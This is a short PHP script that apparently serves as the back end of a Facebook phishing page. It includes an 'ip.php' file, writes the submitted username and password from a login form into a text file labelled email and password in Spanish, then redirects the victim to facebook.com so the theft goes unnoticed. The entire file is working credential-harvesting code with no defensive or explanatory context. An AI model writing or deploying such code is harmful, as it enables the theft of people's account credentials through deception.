<?php
include 'ip.php';

file_put_contents("usuario.txt", "[CORREO]: " . $_POST['User'] . " [CONTRA]: " . $_POST['Password'] . "\n", FILE_APPEND);
header('Location: https://facebook.com');
exit();
